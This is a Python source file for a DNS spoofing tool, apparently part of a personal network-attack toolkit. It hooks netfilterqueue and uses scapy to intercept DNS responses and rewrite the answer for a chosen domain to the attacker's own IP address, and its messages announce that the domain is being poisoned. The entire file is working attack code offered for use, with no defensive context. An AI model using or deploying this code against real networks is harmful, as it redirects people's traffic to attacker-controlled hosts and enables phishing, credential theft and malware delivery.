#!/usr/bin/env python3

import argparse
import netfilterqueue
import scapy.all as scapy
from modules.my_utils import show_message
from modules.net_utils import get_ip
from modules.sys_utils import check_root, setup_nfqueue
from modules.exit_handler import setup_signal_handler

### Classes #########################################################################################################################

class Spoofer:

    def __init__(self, domain, ip):
        self.domain = domain
        self.ip = ip

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        
        if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR) and scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname

            if self.domain.encode() in qname:
                show_message("Envenenando el dominio:", "minus", self.domain)
                answer = scapy.DNSRR(rrname=qname, rdata=self.ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Elimina camps per recalcular checksum i longitud
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(scapy_packet.build())

        packet.accept()


### Functions #######################################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer")
    parser.add_argument("-d", "--domain", dest="domain", required=True, help="Select the domain to spoof")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Select the interface to spoof")

    options = parser.parse_args()
    return options.domain, options.interface

### Main Code #######################################################################################################################

def main():
    check_root()
    setup_signal_handler()
    show_message("Executing:", "info", "DNS Spoofer")

    domain, interface = get_arguments()
    ip = get_ip(interface)

    setup_nfqueue()

    dns_spoofer = Spoofer(domain, ip)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, dns_spoofer.process_packet)
    queue.run()

if __name__ == "__main__":
    main()
